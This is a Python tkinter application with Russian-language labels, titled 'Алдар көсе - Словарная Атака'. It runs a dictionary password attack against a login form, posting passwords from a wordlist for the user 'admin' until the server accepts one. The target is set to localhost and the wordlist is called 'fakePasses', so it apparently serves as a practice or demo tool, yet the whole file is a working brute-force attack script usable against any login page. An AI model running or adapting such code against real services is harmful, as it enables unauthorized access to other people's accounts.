import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import threading
import requests

# Параметры
TARGET_URL = "http://127.0.0.1:5000/login"
USERNAME = "admin"
DICTIONARY_FILE = "dictionaries/top100_fakePasses.txt"

# Функция атаки
def perform_attack():
    with open(DICTIONARY_FILE, "r") as f:
        for line in f:
            password = line.strip()
            status_label.config(text=f"Пробую пароль: {password}")

            response = requests.post(TARGET_URL, data={"username": USERNAME, "password": password})
            if response.status_code == 200:
                messagebox.showinfo("Успех!", f"Пароль найден: {password}")
                break
            elif response.status_code == 401:
                continue

# Запуск атаки в отдельном потоке
def start_attack():
    threading.Thread(target=perform_attack, daemon=True).start()

# Интерфейс
root = tk.Tk()
root.title("Алдар көсе - Словарная Атака")
root.geometry("700x600")

# Set Window Icon
try:

    root.iconbitmap("media/icons/aldar-icon.ico")
except:
    messagebox.showwarning("Предупреждение", "Иконка не найдено!")

# Background Image
try:
    bg_image = Image.open("media/aldar-kose.jpg")
    bg_image = bg_image.resize((800, 650), Image.Resampling.LANCZOS)
    bg_photo = ImageTk.PhotoImage(bg_image)
    bg_label = tk.Label(root, image=bg_photo)
    bg_label.place(relwidth=1, relheight=1)
except:
    messagebox.showwarning("Предупреждение", "Фоновый изображение не найдено!")

# Метки и кнопки
start_button = tk.Button(root, text="Начать атаку", command=start_attack)
start_button.pack(pady=20)

status_label = tk.Label(root, text="Готов к атаке...")
status_label.pack()

root.mainloop()
